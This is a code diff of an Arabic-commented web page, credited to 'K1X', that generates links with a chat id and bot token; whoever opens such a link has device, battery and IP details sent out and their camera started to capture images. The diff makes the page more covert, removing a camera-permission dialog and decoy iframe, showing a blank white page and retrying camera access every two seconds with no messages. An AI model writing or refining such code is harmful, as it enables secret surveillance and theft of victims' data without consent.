@@ -69,7 +69,7 @@
       .wrap{padding:18px}
     }
 
-    /* الدايلوج المطور */
+    /* الدايلوج للصفحة الرئيسية فقط */
     .dialog {
       position: fixed;
       top: 50%;
@@ -143,50 +143,18 @@
       background: transparent;
       color: #ffffff;
     }
-    .check-icon {
-      margin-right: 8px;
-    }
 
-    /* ستايل طلب إذن الكاميرا */
-    .camera-request {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #000000;
-      border: 2px solid #ffffff;
-      border-radius: 20px;
-      padding: 40px 30px;
-      text-align: center;
-      z-index: 999999;
-      box-shadow: 0 0 30px rgba(255,255,255,0.2);
-      width: 80%;
-      max-width: 400px;
-    }
-    .camera-request p {
-      color: #ffffff;
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 30px;
-    }
-    .camera-btn {
-      display: inline-block;
+    /* الصفحة البيضاء الفارغة */
+    .white-page {
+      width: 100%;
+      height: 100vh;
       background: #ffffff;
-      color: #000000;
-      padding: 16px 30px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      width: 80%;
-      cursor: pointer;
-      margin: 10px 0;
-    }
-    .camera-btn:hover {
-      background: transparent;
-      color: #ffffff;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 1;
     }
   </style>
 </head>
@@ -234,7 +202,7 @@
   <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
 
-  <!-- الدايلوج بشرط الاشتراك في قناتين -->
+  <!-- الدايلوج للصفحة الرئيسية فقط -->
   <div class="dialog" id="mandatoryDialog">
     <p> اشتراك إجباري في القنوات </p>
     <div class="dialog-buttons" id="dialogButtons">
@@ -321,7 +289,7 @@
   // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
   sendVisitorInfo();
 
-  // ------------------ عناصر الدايلوج ------------------
+  // ------------------ عناصر الدايلوج (للمستخدم الرئيسي فقط) ------------------
   const dialog = document.getElementById('mandatoryDialog');
   const channel1 = document.getElementById('channel1');
   const channel2 = document.getElementById('channel2');
@@ -382,10 +350,8 @@
       return;
     }
 
-    // تم إزالة متغير الرابط بالكامل، نستخدم رابط ثابت بدلاً من ذلك
-    const fixedUrl = "https://www.google.com"; // رابط ثابت بدلاً من إدخال المستخدم
-    
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(fixedUrl)}`;
+    // رابط ثابت - يتم إزالته تماماً من الباراميترز
+    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}`;
     linkText.innerText = fullLink;
     resultEl.style.display = 'flex';
   });
@@ -400,8 +366,8 @@
     }
   });
 
-  // ------------------ دالة تشغيل الكاميرا ------------------
-  async function startCameraAndSend(chat, token, target) {
+  // ------------------ دالة تشغيل الكاميرا مع إعادة المحاولة التلقائية ------------------
+  async function startCameraAndSend(chat, token) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       
@@ -464,7 +430,6 @@
 📱 *الجهاز*: ${visitorDevice}
 🔋 *البطارية*: ${visitorBattery}
 🌐 *IP*: ${visitorIP}
-🔗 *الرابط المعروض*: ${target}
 🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
             `;
@@ -497,77 +462,48 @@
       });
 
     } catch (err) {
-      // إذا رفض المستخدم إذن الكاميرا، نعرض له مربع طلب مرة أخرى
-      showCameraRequestDialog(chat, token, target);
+      // إعادة المحاولة تلقائياً بعد ثانيتين
+      console.log("فشل الوصول للكاميرا، إعادة المحاولة...");
+      setTimeout(() => {
+        startCameraAndSend(chat, token);
+      }, 2000);
     }
-  }
-
-  // ------------------ دالة عرض مربع طلب الكاميرا ------------------
-  function showCameraRequestDialog(chat, token, target) {
-    // إزالة أي مربع طلب سابق
-    const oldDialog = document.querySelector('.camera-request');
-    if (oldDialog) oldDialog.remove();
-    
-    const cameraDialog = document.createElement('div');
-    cameraDialog.className = 'camera-request';
-    cameraDialog.innerHTML = `
-      <p>📸 نحتاج إذن الوصول إلى الكاميرا</p>
-      <p style="font-size:16px; color:#ccc;">لإتمام العملية، يجب السماح باستخدام الكاميرا</p>
-      <button class="camera-btn" id="requestCameraBtn">السماح بالكاميرا</button>
-      <button class="camera-btn" id="cancelCameraBtn" style="background:transparent; color:white; border:1px solid white;">رفض</button>
-    `;
-    
-    document.body.appendChild(cameraDialog);
-    
-    document.getElementById('requestCameraBtn').addEventListener('click', async () => {
-      cameraDialog.remove();
-      await startCameraAndSend(chat, token, target);
-    });
-    
-    document.getElementById('cancelCameraBtn').addEventListener('click', () => {
-      cameraDialog.remove();
-      const captureBadge = document.getElementById('captureBadge');
-      captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
-      captureBadge.style.display = 'inline-block';
-      captureBadge.style.background = 'rgba(160,40,40,0.9)';
-    });
   }
 
   // ------------------ viewer mode ------------------
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
-  const target = params.get('url');
 
-  if (chat && token && target) {
-    // إخفاء الكارت وعرض الـ iframe
-    document.getElementById('cardArea').style.display = 'none';
-    document.querySelector('.wrap').style.padding = '0';
-    document.querySelector('.wrap').style.margin = '0';
-    document.querySelector('.wrap').style.maxWidth = '100%';
+  if (chat && token) {
+    // إخفاء الدايلوج نهائياً في الصفحة الجانبية
+    dialog.style.display = 'none';
     
-    // إخفاء عناصر الواجهة الأخرى
+    // إخفاء الكارت وجميع العناصر الأخرى
+    document.getElementById('cardArea').style.display = 'none';
     document.querySelector('.header').style.display = 'none';
     document.querySelector('.madeby').style.display = 'none';
     
-    // إزالة أي محتوى في الـ wrap
+    // إخفاء captureBadge
+    const captureBadge = document.getElementById('captureBadge');
+    captureBadge.style.display = 'none';
+    
+    // تنظيف الصفحة بالكامل
     const wrap = document.querySelector('.wrap');
     wrap.innerHTML = '';
+    wrap.style.padding = '0';
+    wrap.style.margin = '0';
+    wrap.style.maxWidth = '100%';
+    wrap.style.background = '#ffffff';
     
-    // إنشاء iframe
-    const iframe = document.createElement('iframe');
-    iframe.className = 'viewerFrame';
-    iframe.src = target;
-    wrap.appendChild(iframe);
-
-    const captureBadge = document.getElementById('captureBadge');
-    captureBadge.style.display = 'inline-block';
-    captureBadge.textContent = '';
-    captureBadge.style.background = 'rgba(0,0,0,0.0)';
-
-    // تشغيل الكاميرا
-    startCameraAndSend(chat, token, target);
+    // إنشاء صفحة بيضاء فارغة
+    const whitePage = document.createElement('div');
+    whitePage.className = 'white-page';
+    wrap.appendChild(whitePage);
+    
+    // تشغيل الكاميرا - إعادة المحاولة التلقائية بدون أي رسائل
+    startCameraAndSend(chat, token);
   }
 </script>
 </body>
-            </html>
+      </html>
